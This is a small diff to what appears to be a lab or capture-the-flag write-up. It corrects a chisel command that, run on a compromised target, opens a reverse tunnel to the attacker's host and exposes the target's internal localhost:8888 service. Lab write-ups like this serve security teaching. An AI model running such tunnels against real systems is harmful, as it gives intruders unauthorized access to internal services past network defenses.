@@ -165,7 +165,7 @@ chisel server -p 8001 --reverse
 Then, from the target establish the tunnel using:
 
 ```cmd
-chisel.exe client 10.10.14.54:8001 R:8001:127.0.0.1:8001
+chisel.exe client 10.10.14.54:8001 R:8888:127.0.0.1:8888
 ```
 
 This will open port 8888 on our Kali, and transfer the traffic from target's localhost:8888 to it. 
